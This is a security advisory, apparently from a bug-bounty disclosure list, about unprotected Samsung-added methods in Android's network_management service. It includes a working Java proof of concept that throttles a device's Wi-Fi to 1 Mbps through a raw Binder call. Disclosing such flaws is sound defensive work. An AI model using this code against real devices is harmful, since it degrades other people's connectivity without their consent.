# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Android Framework</td>
    </tr>
    <tr>
        <td>Library path</td>
        <td><code>/system/framework/services.jar</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.08.10</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2023.01.04</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Low</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td>N/A</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$250</td>
    </tr>
</table>

# Description

The system service `network_management` (`android.os.INetworkManagementService`) was created in AOSP, but was patched in the Samsung Android Framework. Samsung added additional functionality to manage the network on the device, including methods:
- `addApeRule()`, `replaceApeRule()`, created to limit speed on a particular network interface
- `prioritizeApp()`, makes a specific UID prioritized

These methods were unprotected in any way, allowing an attacker to set system settings.

**Proof of Concept**

This code limits Wi-Fi speed to 1mbps:
```java
static final int TRANSACTION_addApeRule = 128;

protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    try {
        IBinder binder = getService("network_management");
        Parcel parcel = Parcel.obtain();
        parcel.writeInterfaceToken(binder.getInterfaceDescriptor());
        parcel.writeBoolean(true);
        parcel.writeString("wlan0");
        parcel.writeInt(1);

        Parcel reply = Parcel.obtain();
        binder.transact(TRANSACTION_addApeRule, parcel, reply, 0);
        reply.readException();
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}

private IBinder getService(String name) throws Throwable {
    return (IBinder) Class.forName("android.os.ServiceManager")
            .getDeclaredMethod("getServiceOrThrow", String.class)
            .invoke(null, name);
}
```

## References

- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)
